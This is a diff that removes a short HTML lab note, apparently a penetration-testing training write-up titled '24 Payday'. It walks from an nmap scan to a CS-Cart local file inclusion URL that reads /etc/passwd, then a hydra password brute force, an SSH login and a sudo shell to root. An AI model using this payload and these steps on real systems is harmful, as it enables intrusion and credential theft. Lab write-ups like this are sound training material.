@@ -1,8 +1,0 @@
-<!doctype html><html>
-    <head>
-      <meta http-equiv="content-type" content="text/html; charset=utf-8">
-      <title>24 Payday</title>
-      <meta name="generator" content="CherryTree">
-      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
-    </head>
-    <body><div class='page'><h1 class='title'>24 Payday</h1><br/>nmap showed an assload of ports open 80 being one of them<br />Going to the webpage showed me that it is running cs cart<br />searchsploit told me that cs cart was vulnerable<br />10.11.1.24/install.php showed me the version was 1.3.3<br />searchsploit pointed me to <a href="file:///usr/share/exploitdb/exploits/php/webapps/1872.txt">/usr/share/exploitdb/exploits/php/webapps/1872.txt</a><br /><a href="http://10.11.1.24/classes/phpmailer/class.cs_phpmailer.php?classes_dir=/etc/passwd%00">http://10.11.1.24/classes/phpmailer/class.cs_phpmailer.php?classes_dir=/etc/passwd%00</a><br />^^gave me /etc/passwd!!!<br />patrick is a user!! send to hydra with tirefire and rockyou...BOOM user patrick password patrick<br />ssh in... user shell!!<br /><br /><br />poke around...nothing special<br />sudo -l says I can do it all<br />sudo /bin/bash -i<br />whoami<br />    root</div></body></html>
